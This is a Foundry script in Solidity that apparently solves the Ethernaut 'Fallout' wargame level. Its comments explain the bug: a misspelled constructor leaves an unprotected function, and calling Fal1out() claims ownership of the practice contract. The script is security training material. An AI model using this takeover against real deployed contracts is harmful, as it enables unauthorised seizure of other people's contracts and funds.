// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import { Fallout } from "../src/Fallout.sol";
import { Script } from "forge-std/Script.sol";
import { console } from "forge-std/console.sol";

contract FalloutSolution is Script {
    address public ethernautInstanceAddress = 0x0;
    Fallout public falloutInstance = Fallout(payable(ethernautInstanceAddress));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // the solution is trivial:
        // the "constructor" has a typo and behaves like a normal function
        // it is also unprotected, and we can call it to claim ownership of the contract
        falloutInstance.Fal1out(); // will set owner = msg.sender
        vm.stopBroadcast();
    }

}